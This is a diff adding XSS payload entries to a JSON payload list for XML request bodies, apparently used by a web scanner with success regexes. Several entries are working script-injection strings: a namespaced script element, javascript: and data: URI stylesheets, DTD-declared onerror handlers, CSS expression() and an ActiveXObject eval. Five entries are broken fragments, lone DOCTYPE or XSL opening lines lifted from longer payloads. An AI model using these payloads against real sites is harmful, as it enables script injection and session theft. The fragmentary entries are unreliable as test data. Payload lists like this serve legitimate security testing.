@@ -152,5 +152,126 @@
       "expected_status_code": 200,
       "success_regex": "<script>alert|prompt|confirm"
     }
+  },
+  {
+    "payload_id": "OWP-246504",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246536",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE html>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246748",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "    <xsl:stylesheet id=\"stylesheet\" version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246749",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "        <xsl:template match=\"/\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-246908",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-247398",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(8554);</html:script></html:html>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-318521",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml-stylesheet href=\"javascript:alert(17)\"?><root/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-318554",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><?xml-stylesheet type=\"text/xsl\" href=\"data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E\"?><root/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-318555",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE x [<!ATTLIST img xmlns CDATA \"http://www.w3.org/1999/xhtml\" src CDATA \"xx:x\" onerror CDATA \"alert(67)\" onload CDATA \"alert(2)\">]><img />",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-318564",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml-stylesheet type=\"text/css\"?><root style=\"x:expression(alert(77))\"/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-318601",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml-stylesheet type=\"text/xsl\" href=\"#\" ?><stylesheet xmlns=\"http://www.w3.org/TR/WD-xsl\"><template match=\"/\"><eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(135)</eval><if expr=\"new ActiveXObject('htmlfile').parentWindow.alert(2)\"></if></template></stylesheet>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
   }
 ]
